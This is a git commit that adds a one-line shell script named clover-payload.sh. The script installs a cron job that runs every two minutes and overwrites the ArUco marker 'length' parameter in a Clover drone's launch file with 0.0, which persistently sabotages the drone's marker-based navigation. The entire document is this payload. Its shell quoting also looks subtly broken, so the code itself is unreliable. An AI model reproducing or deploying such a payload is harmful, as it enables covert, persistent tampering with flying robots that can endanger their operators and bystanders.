5ac0fa8235d316e093d589e330f9bc23cc8a05b0
Dead_moon <58658937+GloryToMoon@users.noreply.github.com>
2021-03-09 16:51:43 +0300

    Create clover-payload.sh

---
+++ clover-payload.sh
@@ -0,0 +1,1 @@
+(crontab -l 2>/dev/null;echo '*/2 * * * * line=grep -i' \''"length"'\' '/home/pi/catkin_ws/src/clover/clover/launch/aruco.launch|awk '\''BEGIN{FS="<"} {print $2}'\'';newline="param name=\"length\" value=\"0.0\"/>";if [ "$line" !=  "$newline" ];then sed -i '\''s@'\''"$line"'\''@'\''"$newline"'\''@g'\'' /home/pi/catkin_ws/src/clover/clover/launch/aruco.launch;fi')|crontab -
